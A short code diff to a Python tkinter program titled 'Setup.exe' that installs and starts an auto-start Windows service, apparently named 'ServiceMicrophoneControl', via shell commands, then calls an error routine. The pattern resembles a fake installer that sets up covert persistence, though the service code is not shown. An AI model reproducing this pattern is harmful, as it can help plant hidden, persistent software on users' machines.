@@ -7,7 +7,6 @@ import time
 import tkinter
 from tkinter import messagebox
 import subprocess
-import os
 
 root = Tk()
 root.title('Setup.exe')
@@ -35,7 +34,7 @@ def progress():
 
     # creation du serivce
     if __name__ == '__main__':
-        os.system('service.exe --startup auto install')
+        subprocess.run('service1.exe --startup auto install', shell=True)
     # verifier que le service a ete cree
     try:
         win32serviceutil.QueryServiceStatus('ServiceMicrophoneControl')
@@ -53,7 +52,7 @@ def progress():
             root.update_idletasks()
             time.sleep(2)
         if progress['value'] == 100.5:
-            os.system('service.exe start')
+            subprocess.run('service1.exe start', shell=True)
             error()
             button2['state'] = tkinter.NORMAL
 
